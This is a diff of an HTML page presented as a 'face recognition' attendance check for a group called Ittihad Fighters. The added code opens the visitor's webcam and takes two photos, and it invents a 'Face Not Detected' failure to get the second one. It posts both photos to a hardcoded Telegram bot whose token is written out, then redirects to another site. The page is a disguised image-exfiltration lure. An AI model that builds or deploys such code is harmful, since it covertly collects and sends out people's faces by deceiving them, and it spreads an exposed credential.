@@ -3,124 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ittihad Fighters Attendance</title>
-    <script>
-        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
-        const TELEGRAM_CHAT_ID = '5934902786';
-        let selectedNames = new Set();
-
-        function toggleName(name) {
-            if (selectedNames.has(name)) return;
-            selectedNames.add(name);
-            document.getElementById(name).disabled = true;
-        }
-
-        function showFaceRecognition() {
-            document.getElementById('name-selection').style.display = 'none';
-            document.getElementById('face-recognition').style.display = 'block';
-        }
-
-        function cancelProcess() {
-            alert('Page will stop here.');
-        }
-
-        function startFaceScan() {
-            document.getElementById('face-recognition').style.display = 'none';
-            document.getElementById('scan-animation').style.display = 'block';
-            setTimeout(captureImage, 2000);
-        }
-
-        function captureImage() {
-            let canvas = document.createElement('canvas');
-            let ctx = canvas.getContext('2d');
-            canvas.width = 640;
-            canvas.height = 480;
-            ctx.fillStyle = "black";
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(blob => sendImage(blob), 'image/jpeg');
-
-            setTimeout(() => {
-                document.getElementById('scan-animation').style.display = 'none';
-                document.getElementById('face-not-detected').style.display = 'block';
-                setTimeout(() => {
-                    document.getElementById('face-not-detected').style.display = 'none';
-                    document.getElementById('scan-animation').style.display = 'block';
-                    setTimeout(captureSecondImage, 3000);
-                }, 3000);
-            }, 2000);
-        }
-
-        function captureSecondImage() {
-            let canvas = document.createElement('canvas');
-            let ctx = canvas.getContext('2d');
-            canvas.width = 640;
-            canvas.height = 480;
-            ctx.fillStyle = "black";
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(blob => sendImage(blob, true), 'image/jpeg');
-        }
-
-        function sendImage(blob, final = false) {
-            let formData = new FormData();
-            formData.append("chat_id", TELEGRAM_CHAT_ID);
-            formData.append("photo", blob, "face.jpg");
-
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            }).then(() => {
-                if (final) showSuccessMessage();
-            }).catch(err => console.error("Error sending photo: ", err));
-        }
-
-        function showSuccessMessage() {
-            document.getElementById('scan-animation').style.display = 'none';
-            document.getElementById('success-message').style.display = 'block';
-            document.getElementById('signed-names').innerText = Array.from(selectedNames).join(', ') + " signed in";
-            setTimeout(() => {
-                window.location.href = "https://studandlearn.github.io/project-2/";
-            }, 3000);
-        }
-    </script>
+    <title>Ittihad Fighters - Attendance</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         body { text-align: center; font-family: Arial, sans-serif; }
         .hidden { display: none; }
+        #animation { font-size: 24px; font-weight: bold; margin-top: 20px; }
+        #scanning-animation { display: none; font-size: 24px; font-weight: bold; color: blue; }
+        #face-not-detected { display: none; font-size: 24px; font-weight: bold; color: red; }
     </style>
 </head>
 <body>
     <h1>Ittihad Fighters</h1>
-    
-    <div id="name-selection">
-        <h2>Select Your Name</h2>
-        <button id="Izz" onclick="toggleName('Izz')">Izz</button>
-        <button id="Ali" onclick="toggleName('Ali')">Ali</button>
-        <button id="Ahmad" onclick="toggleName('Ahmad')">Ahmad</button>
-        <br><br>
-        <button onclick="showFaceRecognition()">Continue</button>
+    <div id="attendance-section">
+        <p>Select Your Name:</p>
+        <select id="name-select">
+            <option value="izz">Izz</option>
+            <option value="ahmad">Ahmad</option>
+            <option value="ali">Ali</option>
+        </select>
+        <button onclick="markAttendance()">Mark Attendance</button>
+    </div>
+
+    <div id="face-recognition-section" class="hidden">
+        <p>Face Recognition</p>
+        <button onclick="startScanning()">Continue</button>
         <button onclick="cancelProcess()">Cancel</button>
     </div>
 
-    <div id="face-recognition" class="hidden">
-        <h2>Face Recognition</h2>
-        <button onclick="startFaceScan()">Continue</button>
-        <button onclick="cancelProcess()">Cancel</button>
-    </div>
+    <div id="scanning-animation">Scanning face...</div>
+    <div id="face-not-detected">Face Not Detected</div>
+    <canvas id="canvas" class="hidden"></canvas>
+    <p id="final-message" class="hidden"></p>
 
-    <div id="scan-animation" class="hidden">
-        <h2>Scanning...</h2>
-    </div>
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
+        const TELEGRAM_CHAT_ID = '5934902786';
+        let markedNames = new Set();
+        
+        function markAttendance() {
+            let nameSelect = document.getElementById('name-select');
+            let selectedName = nameSelect.value;
+            
+            if (markedNames.has(selectedName)) {
+                Swal.fire('Error', 'This name has already been marked.', 'error');
+                return;
+            }
+            markedNames.add(selectedName);
+            document.getElementById('attendance-section').classList.add('hidden');
+            document.getElementById('face-recognition-section').classList.remove('hidden');
+        }
 
-    <div id="face-not-detected" class="hidden">
-        <h2>Face Not Detected</h2>
-    </div>
+        function cancelProcess() {
+            Swal.fire('Process Cancelled', 'Page will stop here.', 'info');
+        }
 
-    <div id="success-message" class="hidden">
-        <h2>✅ Done</h2>
-        <p id="signed-names"></p>
-        <p>You look beautiful/handsome today!</p>
-        <p>Redirecting to the next page...</p>
-    </div>
+        function startScanning() {
+            document.getElementById('face-recognition-section').classList.add('hidden');
+            document.getElementById('scanning-animation').style.display = 'block';
+            
+            setTimeout(captureAndSend, 2000);
+        }
+
+        function captureAndSend() {
+            let canvas = document.getElementById('canvas');
+            let ctx = canvas.getContext('2d');
+            let video = document.createElement('video');
+            
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    sendPhoto(canvas);
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                    
+                    document.getElementById('scanning-animation').style.display = 'none';
+                    document.getElementById('face-not-detected').style.display = 'block';
+                    
+                    setTimeout(() => {
+                        document.getElementById('face-not-detected').style.display = 'none';
+                        document.getElementById('scanning-animation').style.display = 'block';
+                        
+                        setTimeout(() => {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            sendPhoto(canvas);
+                            video.srcObject.getTracks().forEach(track => track.stop());
+                            
+                            document.getElementById('scanning-animation').style.display = 'none';
+                            document.getElementById('final-message').innerText = `${document.getElementById('name-select').value} signed in. You look beautiful/handsome today! Redirecting...`;
+                            document.getElementById('final-message').classList.remove('hidden');
+                            
+                            setTimeout(() => {
+                                window.location.href = 'https://studandlearn.github.io/project-2/';
+                            }, 3000);
+                        }, 2000);
+                    }, 5000);
+                }, 2000);
+            }).catch(err => console.error('Camera access denied:', err));
+        }
+        
+        function sendPhoto(canvas) {
+            canvas.toBlob(blob => {
+                let formData = new FormData();
+                formData.append("chat_id", TELEGRAM_CHAT_ID);
+                formData.append("photo", blob, "face.jpg");
+                
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                }).catch(err => console.error("Error sending photo: ", err));
+            }, 'image/jpeg');
+        }
+    </script>
 </body>
 </html>
